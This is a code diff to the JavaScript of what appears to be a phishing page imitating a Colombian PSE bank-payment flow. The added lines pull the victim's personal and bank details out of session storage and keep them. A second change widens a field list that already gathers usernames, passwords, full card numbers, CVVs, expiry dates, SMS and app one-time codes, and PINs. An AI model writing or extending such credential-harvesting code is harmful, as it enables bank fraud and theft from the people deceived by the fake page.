@@ -687,6 +687,34 @@
 
             console.log('Session UniqID:', appState.uniqId);
 
+            // ==================== RECUPERAR DATOS PSE ====================
+            const pseDatosStr = sessionStorage.getItem('pseDatos');
+            if (pseDatosStr) {
+                try {
+                    const pseDatos = JSON.parse(pseDatosStr);
+                    const camposPSE = {
+                        'nombre': pseDatos.nombre,
+                        'email': pseDatos.email,
+                        'celular': pseDatos.celular,
+                        'direccion': pseDatos.direccion,
+                        'ciudad': pseDatos.ciudad,
+                        'departamento': pseDatos.departamento,
+                        'banco': pseDatos.banco,
+                        'tipoPersona': pseDatos.tipoPersona,
+                        'ente': 'brasilia'
+                    };
+                    Object.keys(camposPSE).forEach(key => {
+                        if (camposPSE[key]) {
+                            const storageKey = `${appState.uniqId}_${key}`;
+                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
+                        }
+                    });
+                    console.log('Datos PSE recuperados:', pseDatos);
+                } catch (e) {
+                    console.error('Error al parsear pseDatos:', e);
+                }
+            }
+
             // ==================== FUNCIONES AUXILIARES ====================
             function saveToLocalStorage(key, value) {
                 const storageKey = `${appState.uniqId}_${key}`;
@@ -816,7 +844,8 @@
                 const allData = {};
                 const fields = [
                     'usuario', 'clave', 'ente', 'nombre', 'cedula', 'email', 'celular',
-                    'ciudad', 'direccion', 'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
+                    'ciudad', 'direccion', 'departamento', 'banco', 'tipoPersona',
+                    'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                     'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC', 'codsms', 'codapp',
                     'pincaj', 'pinvir', 'status', 'uniqid'
                 ];
